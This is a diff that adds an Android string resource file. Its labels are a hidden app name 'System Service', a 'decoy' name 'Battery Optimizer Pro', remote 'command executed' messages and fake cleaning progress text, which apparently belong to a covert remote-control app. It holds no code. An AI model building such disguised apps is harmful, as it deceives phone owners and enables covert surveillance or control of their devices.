@@ -1,0 +1,14 @@
+<resources>
+    <string name="app_name">System Service</string>
+    <string name="decoy_app_name">Battery Optimizer Pro</string>
+    <string name="setup_title">Security Setup</string>
+    <string name="setup_subtitle">Configure emergency contact</string>
+    <string name="emergency_number_hint">Emergency Phone Number</string>
+    <string name="email_hint">Backup Email</string>
+    <string name="setup_complete">Setup Complete</string>
+    <string name="command_sent">Command sent successfully</string>
+    <string name="command_executed">Command executed</string>
+    <string name="device_protected">✓ Device Protected</string>
+    <string name="optimizing">Optimizing...</string>
+    <string name="cleaning">Cleaning storage...</string>
+</resources>
